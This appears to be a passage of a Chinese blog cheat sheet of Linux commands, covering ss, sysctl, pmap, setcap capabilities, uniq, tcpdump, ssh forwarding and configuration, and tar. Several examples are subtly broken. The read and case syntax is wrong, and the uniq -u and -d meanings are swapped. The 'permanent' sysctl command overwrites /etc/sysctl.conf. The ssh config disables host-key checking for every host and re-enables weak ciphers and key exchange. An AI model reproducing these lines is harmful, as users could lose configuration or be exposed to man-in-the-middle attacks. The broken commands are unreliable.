<h2 id="31-read-读取输入"><a href="#31-read-读取输入" class="headerlink" title="31. read 读取输入"></a>31. read 读取输入</h2><h3 id="31-1-读取用户输入"><a href="#31-1-读取用户输入" class="headerlink" title="31.1. 读取用户输入"></a>31.1. 读取用户输入</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">read -s 5 -p &quot;do you wan&#x27;t to continue [y/n]&quot; input</span><br><span class="line">case &quot;$input&quot; in</span><br><span class="line">case [Yy]*)</span><br></pre></td></tr></table></figure>

<h2 id="32-conntrack-连接跟踪"><a href="#32-conntrack-连接跟踪" class="headerlink" title="32. conntrack 连接跟踪"></a>32. conntrack 连接跟踪</h2><h3 id="32-1-选项解释"><a href="#32-1-选项解释" class="headerlink" title="32.1. 选项解释"></a>32.1. 选项解释</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看连接跟踪表</span></span><br><span class="line">conntrack -L &lt;options&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>-p [protocol]</code></li>
<li><code>-s [src_ip]</code></li>
<li><code>-d [dst_ip]</code></li>
<li><code>--sport [src_port]</code></li>
<li><code>--dport [dst_port]</code></li>
<li><code>--state [NONE | SYN_SENT | SYN_RECV | ESTABLISHED | FIN_WAIT | CLOSE_WAIT | LAST_ACK | TIME_WAIT | CLOSE | LISTEN]</code>: 过滤状态</li>
</ul>
<h2 id="33-ss-查看socket占用情况"><a href="#33-ss-查看socket占用情况" class="headerlink" title="33. ss 查看socket占用情况"></a>33. ss 查看socket占用情况</h2><h3 id="33-1-选项解释"><a href="#33-1-选项解释" class="headerlink" title="33.1. 选项解释"></a>33.1. 选项解释</h3><ul>
<li><code>-t</code>: tcp</li>
<li><code>-u</code>: udp</li>
<li><code>-x</code>: unix</li>
<li><code>-l</code>: listening</li>
<li><code>-p</code>: 展示进程信息</li>
<li><code>-m</code>: 展示socket内存占用情况</li>
<li><code>-n</code>: 不把端口自动推测成服务，显示原始端口<br>v9k</li>
</ul>
<h3 id="33-2-使用实例"><a href="#33-2-使用实例" class="headerlink" title="33.2. 使用实例"></a>33.2. 使用实例</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看22端口占用</span></span><br><span class="line">=&gt; ss -tnlp | grep &#x27;:22&#x27;</span><br><span class="line">LISTEN  0        128                    0.0.0.0:22               0.0.0.0:*       users:((&quot;sshd&quot;,pid=25985,fd=3))</span><br><span class="line">LISTEN  0        128                       [::]:22                  [::]:*       users:((&quot;sshd&quot;,pid=25985,fd=4))</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看25985进程占用情况</span></span><br><span class="line">=&gt; ss -tnlp | grep &#x27;pid=25985&#x27;</span><br><span class="line">LISTEN  0        128                    0.0.0.0:22               0.0.0.0:*       users:((&quot;sshd&quot;,pid=25985,fd=3))</span><br><span class="line">LISTEN  0        128                       [::]:22                  [::]:*       users:((&quot;sshd&quot;,pid=25985,fd=4))</span><br></pre></td></tr></table></figure>

<h2 id="34-pwd"><a href="#34-pwd" class="headerlink" title="34. pwd"></a>34. pwd</h2><h3 id="34-1-选项解释"><a href="#34-1-选项解释" class="headerlink" title="34.1. 选项解释"></a>34.1. 选项解释</h3><ul>
<li><code>-L</code>: 逻辑路径，软连接路径</li>
<li><code>-P</code>: 物理路径，软连接映射的真实路径</li>
</ul>
<h2 id="35-mknod"><a href="#35-mknod" class="headerlink" title="35. mknod"></a>35. mknod</h2><ul>
<li>用于挂载设备节点</li>
</ul>
<h3 id="35-1-示例"><a href="#35-1-示例" class="headerlink" title="35.1. 示例"></a>35.1. 示例</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">挂载字符型设备，主设备号1，次设备号8</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">c     character special file</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1 8   Device <span class="built_in">type</span>: 1,8</span></span><br><span class="line">mknod /dev/random c 1 8</span><br></pre></td></tr></table></figure>

<h2 id="36-sudo"><a href="#36-sudo" class="headerlink" title="36. sudo"></a>36. sudo</h2><h3 id="36-1-选项"><a href="#36-1-选项" class="headerlink" title="36.1. 选项"></a>36.1. 选项</h3><ul>
<li><code>-E</code>: 继承当前环境变量</li>
</ul>
<h2 id="37-sysctl-修改内核参数"><a href="#37-sysctl-修改内核参数" class="headerlink" title="37. sysctl 修改内核参数"></a>37. sysctl 修改内核参数</h2><h3 id="37-1-选项"><a href="#37-1-选项" class="headerlink" title="37.1. 选项"></a>37.1. 选项</h3><ul>
<li><code>-a</code>: 列举所有内核参数</li>
<li><code>-p</code>: 从<code>/etc/sysctl.conf</code>加载配置</li>
<li><code>-w</code>: 修改内核参数</li>
</ul>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找当前配置</span></span><br><span class="line">=&gt; sudo sysctl -a | grep compa</span><br><span class="line">net.ipv4.nexthop_compat_mode = 1</span><br><span class="line">vm.compact_unevictable_allowed = 1</span><br><span class="line">vm.compaction_proactiveness = 20</span><br><span class="line">vm.mmap_rnd_compat_bits = 8</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">临时修改kernel配置</span></span><br><span class="line">=&gt; sudo sysctl -w vm.compaction_proactiveness=0</span><br><span class="line">vm.compaction_proactiveness = 0</span><br><span class="line">=&gt; sudo sysctl -a | grep compa</span><br><span class="line">net.ipv4.nexthop_compat_mode = 1</span><br><span class="line">vm.compact_unevictable_allowed = 1</span><br><span class="line">vm.compaction_proactiveness = 0</span><br><span class="line">vm.mmap_rnd_compat_bits = 8</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">永久修改kernel配置</span></span><br><span class="line">=&gt; sudo bash -c &quot;echo \&quot;vm.compaction_proactiveness=0\&quot; &gt; /etc/sysctl.conf&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">从配置文件读取配置</span></span><br><span class="line">=&gt; sudo sysctl -p</span><br><span class="line">vm.compaction_proactiveness = 0</span><br><span class="line">=&gt; sudo sysctl -a | grep compa</span><br><span class="line">net.ipv4.nexthop_compat_mode = 1</span><br><span class="line">vm.compact_unevictable_allowed = 1</span><br><span class="line">vm.compaction_proactiveness = 0</span><br><span class="line">vm.mmap_rnd_compat_bits = 8</span><br></pre></td></tr></table></figure>

<h2 id="38-pmap查看进程内存情况"><a href="#38-pmap查看进程内存情况" class="headerlink" title="38. pmap查看进程内存情况"></a>38. pmap查看进程内存情况</h2><h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><ul>
<li><code>-x</code>: 显示扩展格式</li>
<li><code>-d</code>: 显示设备格式</li>
<li><code>-q</code>: 不显示头尾行</li>
<li><code>-V</code>: 显示指定版本</li>
</ul>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; pmap -x 76381</span><br><span class="line">76381:   build/output/run</span><br><span class="line">Address           Kbytes     RSS   Dirty Mode  Mapping</span><br><span class="line">0000560aff840000      44      44       0 r---- run</span><br><span class="line">0000560aff84b000     484     484       0 r-x-- run</span><br><span class="line">0000560aff8c4000     288      64       0 r---- run</span><br><span class="line">0000560aff90c000      12      12      12 r---- run</span><br><span class="line">0000560aff90f000       4       4       4 rw--- run</span><br><span class="line">0000560aff910000       4       4       4 rw---   [ anon ]</span><br><span class="line">0000560affa43000     132      16      16 rw---   [ anon ]</span><br><span class="line">00007f31dae00000     160     160       0 r---- libc.so.6</span><br><span class="line">00007f31dae28000    1512    1044       0 r-x-- libc.so.6</span><br><span class="line">00007f31dafa2000     352     180       0 r---- libc.so.6</span><br><span class="line">00007f31daffa000      16      16      16 r---- libc.so.6</span><br><span class="line">00007f31daffe000       8       8       8 rw--- libc.so.6</span><br><span class="line">00007f31db000000      52      20      20 rw---   [ anon ]</span><br><span class="line">00007f31db200000     612     612       0 r---- libstdc++.so.6.0.30</span><br><span class="line">00007f31db299000    1112     764       0 r-x-- libstdc++.so.6.0.30</span><br><span class="line">00007f31db3af000     476     116       0 r---- libstdc++.so.6.0.30</span><br><span class="line">00007f31db426000      52      52      52 r---- libstdc++.so.6.0.30</span><br><span class="line">00007f31db433000       4       4       4 rw--- libstdc++.so.6.0.30</span><br><span class="line">00007f31db434000      12      12      12 rw---   [ anon ]</span><br><span class="line">00007f31db474000      20      16      16 rw---   [ anon ]</span><br><span class="line">00007f31db479000      12      12       0 r---- libgcc_s.so.1</span><br><span class="line">00007f31db47c000      92      64       0 r-x-- libgcc_s.so.1</span><br><span class="line">00007f31db493000      16      16       0 r---- libgcc_s.so.1</span><br><span class="line">00007f31db497000       4       4       4 r---- libgcc_s.so.1</span><br><span class="line">00007f31db498000       4       4       4 rw--- libgcc_s.so.1</span><br><span class="line">00007f31db499000      56      56       0 r---- libm.so.6</span><br><span class="line">00007f31db4a7000     484     224       0 r-x-- libm.so.6</span><br><span class="line">00007f31db520000     376       0       0 r---- libm.so.6</span><br><span class="line">00007f31db57e000       4       4       4 r---- libm.so.6</span><br><span class="line">00007f31db57f000       4       4       4 rw--- libm.so.6</span><br><span class="line">00007f31db5af000       8       8       8 rw---   [ anon ]</span><br><span class="line">00007f31db5b1000       8       8       0 r---- ld-linux-x86-64.so.2</span><br><span class="line">00007f31db5b3000     156     156       0 r-x-- ld-linux-x86-64.so.2</span><br><span class="line">00007f31db5da000      44      40       0 r---- ld-linux-x86-64.so.2</span><br><span class="line">00007f31db5e6000       8       8       8 r---- ld-linux-x86-64.so.2</span><br><span class="line">00007f31db5e8000       8       8       8 rw--- ld-linux-x86-64.so.2</span><br><span class="line">00007ffe6b20a000     136      24      24 rw---   [ stack ]</span><br><span class="line">00007ffe6b2c7000      16       0       0 r----   [ anon ]</span><br><span class="line">00007ffe6b2cb000       8       4       0 r-x--   [ anon ]</span><br><span class="line">ffffffffff600000       4       0       0 --x--   [ anon ]</span><br><span class="line">---------------- ------- ------- -------</span><br><span class="line">total kB            6804    4276     228</span><br></pre></td></tr></table></figure>

<h2 id="39-setcap-提权命令"><a href="#39-setcap-提权命令" class="headerlink" title="39. setcap 提权命令"></a>39. setcap 提权命令</h2><p>参考 <a href="https://www.cnblogs.com/sky-heaven/p/12096758.html">Linux的capability深入分析</a></p>
<ul>
<li>从2.1版开始,Linux内核有了能力(capability)的概念,即它打破了UNIX&#x2F;LINUX操作系统中超级用户&#x2F;普通用户的概念,由普通用户也可以做只有超级用户可以完成的工作</li>
<li>比如给kill命令杀死其他进程的能力，但是不能重启系统，也不能修改文件。仅拥有杀死其他进程的能力</li>
</ul>
<h3 id="39-1-能力列举"><a href="#39-1-能力列举" class="headerlink" title="39.1. 能力列举"></a>39.1. 能力列举</h3><ul>
<li><code>CAP_CHOWN</code>: 修改文件属主的权限</li>
<li><code>CAP_DAC_OVERRIDE</code>: 忽略文件的DAC访问限制</li>
<li><code>CAP_DAC_READ_SEARCH</code>: 忽略文件读及目录搜索的DAC访问限制</li>
<li><code>CAP_FOWNER</code>: 忽略文件属主ID必须和进程用户ID相匹配的限制</li>
<li><code>CAP_FSETID</code>: 允许设置文件的setuid位</li>
<li><code>CAP_KILL</code>: 允许对不属于自己的进程发送信号</li>
<li><code>CAP_SETGID</code>: 允许改变进程的组ID</li>
<li><code>CAP_SETUID</code>: 允许改变进程的用户ID</li>
<li><code>CAP_SETPCAP</code>: 允许向其他进程转移能力以及删除其他进程的能力</li>
<li><code>CAP_LINUX_IMMUTABLE</code>: 允许修改文件的IMMUTABLE和APPEND属性标志</li>
<li><code>CAP_NET_BIND_SERVICE</code>: 允许绑定到小于1024的端口</li>
<li><code>CAP_NET_BROADCAST</code>: 允许网络广播和多播访问</li>
<li><code>CAP_NET_ADMIN</code>: 允许执行网络管理任务</li>
<li><code>CAP_NET_RAW</code>: 允许使用原始套接字</li>
<li><code>CAP_IPC_LOCK</code>: 允许锁定共享内存片段</li>
<li><code>CAP_IPC_OWNER</code>: 忽略IPC所有权检查</li>
<li><code>CAP_SYS_MODULE</code>: 允许插入和删除内核模块</li>
<li><code>CAP_SYS_RAWIO</code>: 允许直接访问&#x2F;devport,&#x2F;dev&#x2F;mem,&#x2F;dev&#x2F;kmem及原始块设备</li>
<li><code>CAP_SYS_CHROOT</code>: 允许使用chroot()系统调用</li>
<li><code>CAP_SYS_PTRACE</code>: 允许跟踪任何进程</li>
<li><code>CAP_SYS_PACCT</code>: 允许执行进程的BSD式审计</li>
<li><code>CAP_SYS_ADMIN</code>: 允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等</li>
<li><code>CAP_SYS_BOOT</code>: 允许重新启动系统</li>
<li><code>CAP_SYS_NICE</code>: 允许提升优先级及设置其他进程的优先级</li>
<li><code>CAP_SYS_RESOURCE</code>: 忽略资源限制</li>
<li><code>CAP_SYS_TIME</code>: 允许改变系统时钟</li>
<li><code>CAP_SYS_TTY_CONFIG</code>: 允许配置TTY设备</li>
<li><code>CAP_MKNOD</code>: 允许使用mknod()系统调用</li>
<li><code>CAP_LEASE</code>: 允许修改文件锁的FL_LEASE标志</li>
</ul>
<h3 id="39-2-示例"><a href="#39-2-示例" class="headerlink" title="39.2. 示例"></a>39.2. 示例</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">给tcpdump设置允许使用原始套接字，使得普通用户可以tcpdump</span></span><br><span class="line">=&gt; sudo setcap &#x27;CAP_NET_RAW+eip&#x27; /usr/sbin/tcpdump</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除tcpdump的权限</span></span><br><span class="line">=&gt; sudo setcap -r /usr/sbin/tcpdump</span><br></pre></td></tr></table></figure>

<h2 id="40-xdg-open-按照系统默认打开方式打开文件"><a href="#40-xdg-open-按照系统默认打开方式打开文件" class="headerlink" title="40. xdg-open 按照系统默认打开方式打开文件"></a>40. xdg-open 按照系统默认打开方式打开文件</h2><ul>
<li>可以打开url、文件等</li>
</ul>
<h2 id="41-uniq-处理重复行"><a href="#41-uniq-处理重复行" class="headerlink" title="41. uniq 处理重复行"></a>41. uniq 处理重复行</h2><h3 id="41-1-选项解释"><a href="#41-1-选项解释" class="headerlink" title="41.1. 选项解释"></a>41.1. 选项解释</h3><ul>
<li><code>-c</code>: 在前面显示重复行数量</li>
<li><code>-u</code>: 只打印不同的行</li>
<li><code>-d</code>: 只打印只出现过一次的行</li>
</ul>
<h3 id="41-2-基本用法"><a href="#41-2-基本用法" class="headerlink" title="41.2. 基本用法"></a>41.2. 基本用法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">统计重复行数量，<span class="built_in">uniq</span>只能对相邻行处理，所以需要先排序</span></span><br><span class="line">=&gt; cat xxx.log | sort | uniq -c</span><br><span class="line">   2427 0x0381</span><br><span class="line">    493 0x0585</span><br><span class="line">   3297 0x4116</span><br><span class="line">    493 0x41af</span><br><span class="line">    493 0x65cb</span><br><span class="line">    493 0x682f</span><br><span class="line">    221 0x74c4</span><br><span class="line">    492 0x78e1</span><br><span class="line">    477 0x7ca0</span><br><span class="line">   3444 0x82dc</span><br><span class="line">     36 0x8f1c</span><br><span class="line">     41 0x9a5a</span><br><span class="line">    477 0xa026</span><br><span class="line">    478 0xaa25</span><br><span class="line">    477 0xb6d2</span><br><span class="line">    477 0xd593</span><br><span class="line">    492 0xf2d3</span><br><span class="line">    477 0xf89b</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">只打印有重复的行</span></span><br><span class="line">=&gt; cat xxx.log | sort | uniq -d</span><br><span class="line">0x0381</span><br><span class="line">0x0585</span><br><span class="line">0x4116</span><br><span class="line">0x41af</span><br><span class="line">0x65cb</span><br><span class="line">0x682f</span><br><span class="line">0x74c4</span><br><span class="line">0x78e1</span><br><span class="line">0x7ca0</span><br><span class="line">0x82dc</span><br><span class="line">0x8f1c</span><br><span class="line">0x9a5a</span><br><span class="line">0xa026</span><br><span class="line">0xaa25</span><br><span class="line">0xb6d2</span><br><span class="line">0xd593</span><br><span class="line">0xf2d3</span><br><span class="line">0xf89b</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">只打印只出现过一次的行，此文件没有所以没输出</span></span><br><span class="line">=&gt; cat xxx.log | sort | uniq -d</span><br></pre></td></tr></table></figure>

<h1 id="三、工具命令"><a href="#三、工具命令" class="headerlink" title="三、工具命令"></a>三、工具命令</h1><h2 id="1-文件夹目录大小-du"><a href="#1-文件夹目录大小-du" class="headerlink" title="1. 文件夹目录大小 du"></a>1. 文件夹目录大小 du</h2><p>当前目录下所有子文件夹和文件的大小</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">du ./ -h --max-depth=1</span><br></pre></td></tr></table></figure>

<h2 id="2-抓包工具-tcpdump"><a href="#2-抓包工具-tcpdump" class="headerlink" title="2. 抓包工具 tcpdump"></a>2. 抓包工具 tcpdump</h2><h3 id="2-1-选项"><a href="#2-1-选项" class="headerlink" title="2.1. 选项"></a>2.1. 选项</h3><ul>
<li><code>-c [num]</code>: 抓取的包的数量</li>
<li><code>-i</code>: 要监听的网口，不给默认为第一个网口</li>
<li><code>-n</code>: 对地址以数字方式显式，否则显示为主机名，也就是说-n选项不做主机名解析</li>
<li><code>-nn</code>: 除了-n的作用外，还把端口显示为数值，否则显示端口服务名</li>
<li><code>-w xxx.pcap</code>: 保存到文件，pcap结尾，用于wirshark分析</li>
<li><code>-v</code>: 显示更多信息，如ip包的存活时间、标识号、总长度和选项，并且检查ip包或icmp包的头部checksum</li>
<li><code>-vv</code>: 除<code>-v</code>作用外，NFS回包和SMB包会被解码</li>
<li><code>-X</code>: 打印每一个包，以hex和ascii的形式打印</li>
</ul>
<h3 id="2-2-过滤器"><a href="#2-2-过滤器" class="headerlink" title="2.2. 过滤器"></a>2.2. 过滤器</h3><ul>
<li><code>host [ip_addr]</code>: 源ip和目的ip为<code>ip_addr</code></li>
<li><code>[src|dst] [ip_addr]</code>: 源ip&#x2F;目的ip为<code>ip_addr</code></li>
<li><code>[protocol]</code>: 协议<ul>
<li><code>tcp</code></li>
<li><code>udp</code></li>
<li><code>icmp</code></li>
<li><code>icmp6</code>: ping ipv6</li>
</ul>
</li>
<li><code>port [port_num]</code>: 端口</li>
<li><code>[src|dst] port [port_num]</code>: 源&#x2F;目的端口</li>
<li><code>[tcp|udp] port [port_num]</code>: tcp&#x2F;udp端口</li>
<li><code>[tcp|udp] [src|dst] port [port_num]</code>: tcp&#x2F;udp的源&#x2F;目的端口</li>
<li><code>ip6</code>: ipv6</li>
</ul>
<h3 id="2-3-示例"><a href="#2-3-示例" class="headerlink" title="2.3. 示例"></a>2.3. 示例</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">抓5个192.168.100.62到本机eth0的icmp（ping）包</span></span><br><span class="line">tcpdump -c 5 -nnvv -i eth0 icmp and src 192.168.100.62</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">抓取10个本机ens33的目的端口为22的tcp包</span></span><br><span class="line">tcpdump -c 10 -nnvv -i ens33 tcp dst port 22</span><br></pre></td></tr></table></figure>

<h2 id="3-网络嗅探-nmap"><a href="#3-网络嗅探-nmap" class="headerlink" title="3. 网络嗅探 nmap"></a>3. 网络嗅探 nmap</h2><p><a href="https://baike.baidu.com/item/nmap/1400075?fr=aladdin">nmap使用</a></p>
<h2 id="4-远程连接-ssh"><a href="#4-远程连接-ssh" class="headerlink" title="4. 远程连接 ssh"></a>4. 远程连接 ssh</h2><h3 id="4-1-ssh生成公钥和私钥"><a href="#4-1-ssh生成公钥和私钥" class="headerlink" title="4.1. ssh生成公钥和私钥"></a>4.1. ssh生成公钥和私钥</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;xxx@xxx.com&quot;</span><br></pre></td></tr></table></figure>

<h3 id="4-2-ssh通过代理访问"><a href="#4-2-ssh通过代理访问" class="headerlink" title="4.2. ssh通过代理访问"></a>4.2. ssh通过代理访问</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">socks5代理</span></span><br><span class="line">ssh -o &quot;ProxyCommand=nc -x 127.0.0.1:1080 %h %p&quot; wangyubo@172.22.2.108</span><br></pre></td></tr></table></figure>

<h3 id="4-3-端口转发"><a href="#4-3-端口转发" class="headerlink" title="4.3. 端口转发"></a>4.3. 端口转发</h3><ul>
<li>手册解释如下</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> -L [bind_address:]port:host:hostport</span><br><span class="line"> -L [bind_address:]port:remote_socket</span><br><span class="line"> -L local_socket:host:hostport</span><br><span class="line"> -L local_socket:remote_socket</span><br><span class="line">         Specifies that connections to the given TCP port or Unix socket on the local (client) host are to be forwarded to the given host and port, or Unix socket, on the remote</span><br><span class="line">         side.  This works by allocating a socket to listen to either a TCP port on the local side, optionally bound to the specified bind_address, or to a Unix socket.  Whenever a</span><br><span class="line">         connection is made to the local port or socket, the connection is forwarded over the secure channel, and a connection is made to either host port hostport, or the Unix</span><br><span class="line">         socket remote_socket, from the remote machine.</span><br><span class="line"></span><br><span class="line">         Port forwardings can also be specified in the configuration file.  Only the superuser can forward privileged ports.  IPv6 addresses can be specified by enclosing the address</span><br><span class="line">         in square brackets.</span><br><span class="line"></span><br><span class="line">         By default, the local port is bound in accordance with the GatewayPorts setting.  However, an explicit bind_address may be used to bind the connection to a specific address.</span><br><span class="line">         The bind_address of “localhost” indicates that the listening port be bound for local use only, while an empty address or ‘*’ indicates that the port should be available from</span><br><span class="line">         all interfaces.</span><br><span class="line">...</span><br><span class="line"> -R [bind_address:]port:host:hostport</span><br><span class="line"> -R [bind_address:]port:local_socket</span><br><span class="line"> -R remote_socket:host:hostport</span><br><span class="line"> -R remote_socket:local_socket</span><br><span class="line"> -R [bind_address:]port</span><br><span class="line">         Specifies that connections to the given TCP port or Unix socket on the remote (server) host are to be forwarded to the local side.</span><br><span class="line"></span><br><span class="line">         This works by allocating a socket to listen to either a TCP port or to a Unix socket on the remote side.  Whenever a connection is made to this port or Unix socket, the con‐</span><br><span class="line">         nection is forwarded over the secure channel, and a connection is made from the local machine to either an explicit destination specified by host port hostport, or</span><br><span class="line">         local_socket, or, if no explicit destination was specified, ssh will act as a SOCKS 4/5 proxy and forward connections to the destinations requested by the remote SOCKS</span><br><span class="line">         client.</span><br><span class="line"></span><br><span class="line">         Port forwardings can also be specified in the configuration file.  Privileged ports can be forwarded only when logging in as root on the remote machine.  IPv6 addresses can</span><br><span class="line">         be specified by enclosing the address in square brackets.</span><br><span class="line"></span><br><span class="line">         By default, TCP listening sockets on the server will be bound to the loopback interface only.  This may be overridden by specifying a bind_address.  An empty bind_address,</span><br><span class="line">         or the address ‘*’, indicates that the remote socket should listen on all interfaces.  Specifying a remote bind_address will only succeed if the server&#x27;s GatewayPorts option</span><br><span class="line">         is enabled (see sshd_config(5)).</span><br><span class="line"></span><br><span class="line">         If the port argument is ‘0’, the listen port will be dynamically allocated on the server and reported to the client at run time.  When used together with -O forward the al‐</span><br><span class="line">         located port will be printed to the standard output.</span><br></pre></td></tr></table></figure>

<ul>
<li>用法</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">监听本地端口9229，转发给远程的9229端口</span></span><br><span class="line">ssh -L 9229:127.0.0.1:9229 admin@199.200.2.170</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">监听远程端口1234，转发给本地的5678端口</span></span><br><span class="line">ssh -R 1234:127.0.0.1:5678 admin@199.200.2.170</span><br></pre></td></tr></table></figure>

<h3 id="4-4-ssh登陆信息"><a href="#4-4-ssh登陆信息" class="headerlink" title="4.4. ssh登陆信息"></a>4.4. ssh登陆信息</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; echo $SSH_CONNECTION</span><br><span class="line">172.22.72.133 56819 172.22.27.203 22</span><br></pre></td></tr></table></figure>

<h4 id="1-添加ssh登陆后执行命令"><a href="#1-添加ssh登陆后执行命令" class="headerlink" title="1) 添加ssh登陆后执行命令"></a>1) 添加ssh登陆后执行命令</h4><ul>
<li>修改<code>.bashrc</code>添加</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ssh远程登陆执行命令</span></span><br><span class="line">if [[ -n &quot;$SSH_CONNECTION&quot; ]] ; then</span><br><span class="line">    echo &quot;I&#x27;m ssh login&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<h3 id="4-5-忽略known-hosts错误"><a href="#4-5-忽略known-hosts错误" class="headerlink" title="4.5. 忽略known_hosts错误"></a>4.5. 忽略<code>known_hosts</code>错误</h3><ul>
<li>配置到<code>~/.ssh/config</code>中</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 对单个服务器</span><br><span class="line">Host test-server</span><br><span class="line">    StrictHostKeyChecking no</span><br><span class="line">    UserKnownHostsFile /dev/null</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"># 对所有服务器</span><br><span class="line">Host *</span><br><span class="line">    StrictHostKeyChecking no</span><br><span class="line">    UserKnownHostsFile /dev/null</span><br></pre></td></tr></table></figure>

<h3 id="踩坑记-1"><a href="#踩坑记-1" class="headerlink" title="踩坑记"></a>踩坑记</h3><h4 id="1-低版本ssh连接失败"><a href="#1-低版本ssh连接失败" class="headerlink" title="(1) 低版本ssh连接失败"></a>(1) 低版本ssh连接失败</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">- 修改`/etc/ssh/ssh_config`或`~/.ssh/config`，添加下面字段即可</span><br><span class="line"></span><br><span class="line">```conf</span><br><span class="line"># 对单个服务器</span><br><span class="line">Host test-server</span><br><span class="line">    # no matching host key type found. Their offer: ssh-rsa,ssh-dss</span><br><span class="line">    HostkeyAlgorithms +ssh-rsa</span><br><span class="line">    PubkeyAcceptedAlgorithms +ssh-rsa</span><br><span class="line">    # no matching key exchange method found. Their offer: diffie-hellman-group1-sha1,diffie-hellman-group14-sha1</span><br><span class="line">    KexAlgorithms +diffie-hellman-group1-sha1</span><br><span class="line">    # no matching cipher found. Their offer: aes128-cbc,3des-cbc,blowfish-cbc,aes192-cbc,aes256-cbc,rijndael128-cbc,rijndael192-cbc,rijndael256-cbc,rijndael-cbc@lysator.liu.se</span><br><span class="line">    Ciphers aes128-ctr,aes192-ctr,aes256-ctr,aes128-cbc,3des-cbc</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"># 对所有服务器</span><br><span class="line">Host *</span><br><span class="line">    # no matching host key type found. Their offer: ssh-rsa,ssh-dss</span><br><span class="line">    HostkeyAlgorithms +ssh-rsa</span><br><span class="line">    PubkeyAcceptedAlgorithms +ssh-rsa</span><br><span class="line">    # no matching key exchange method found. Their offer: diffie-hellman-group1-sha1,diffie-hellman-group14-sha1</span><br><span class="line">    KexAlgorithms +diffie-hellman-group1-sha1</span><br><span class="line">    # no matching cipher found. Their offer: aes128-cbc,3des-cbc,blowfish-cbc,aes192-cbc,aes256-cbc,rijndael128-cbc,rijndael192-cbc,rijndael256-cbc,rijndael-cbc@lysator.liu.se</span><br><span class="line">    Ciphers aes128-ctr,aes192-ctr,aes256-ctr,aes128-cbc,3des-cbc</span><br></pre></td></tr></table></figure>

<h4 id="2-ssh首次登录总要等一会才提示密码框"><a href="#2-ssh首次登录总要等一会才提示密码框" class="headerlink" title="(2) ssh首次登录总要等一会才提示密码框"></a>(2) ssh首次登录总要等一会才提示密码框</h4><ul>
<li>原因是ssh去找主机名的DNS</li>
<li>快速解决是修改服务端的<code>/etc/ssh/sshd_config</code>，然后重启服务</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UseDNS no</span><br></pre></td></tr></table></figure>

<h2 id="5-压缩和解压缩命令"><a href="#5-压缩和解压缩命令" class="headerlink" title="5. 压缩和解压缩命令"></a>5. 压缩和解压缩命令</h2><h3 id="5-1-tar命令"><a href="#5-1-tar命令" class="headerlink" title="5.1. tar命令"></a>5.1. tar命令</h3><h4 id="5-1-1-参数解析"><a href="#5-1-1-参数解析" class="headerlink" title="5.1.1. 参数解析"></a>5.1.1. 参数解析</h4><ul>
<li><code>-c</code>: 建立压缩档案</li>
<li><code>-x</code>: 解压</li>
<li><code>-t</code>: 查看内容</li>
<li><code>-r</code>: 向压缩归档文件末尾追加文件</li>
<li><code>-u</code>: 更新原压缩包中的文件</li>
</ul>
<p>这五个是独立的命令，压缩解压都要用到其中一个，可以和别的命令连用但只能用其中一个。</p>
<ul>
<li><code>-z</code>: 有gzip属性的 tar.gz</li>
<li><code>-j</code>: 有bz2属性的 tar.bz2</li>
<li><code>-J</code>: tar.xz</li>
<li><code>-Z</code>: 有compress属性的 tar.Z</li>
<li><code>-v</code>: 显示所有过程</li>
<li><code>-O</code>: 将文件解开到标准输出</li>
</ul>
<p>这几个根据需要在压缩或解压档案时可选的。</p>
<ul>
<li><code>-f [tar_file_name]</code>: 必须，使用档案名字，多选项时，此参数为最后一个。</li>
<li><code>-C [dir_name]</code>: 解压到什么目录，压缩时的父目录</li>
</ul>
